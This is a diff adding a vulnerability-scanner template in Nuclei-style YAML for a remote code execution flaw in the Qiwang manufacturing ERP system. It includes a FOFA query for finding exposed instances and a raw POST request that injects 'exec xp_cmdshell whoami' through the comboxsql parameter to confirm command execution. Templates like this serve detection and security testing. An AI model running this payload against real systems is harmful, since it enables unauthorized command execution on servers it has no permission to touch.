@@ -1,0 +1,35 @@
+id: QiwangzhizaoERP-Comboxstore-RCE
+
+info:
+  name: 企望制造ERP系统-comboxstore-RCE漏洞
+  author: candada
+  severity: critical
+  description: description
+  reference:
+    - https://
+  metadata:
+    fofa-query: title="企望制造ERP系统"
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        POST /mainFunctions/comboxstore.action HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Host: {{Hostname}}
+
+        comboxsql=exec%20xp_cmdshell%20'whoami'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - nt authority
+      - type: status
+        status:
+          - 200
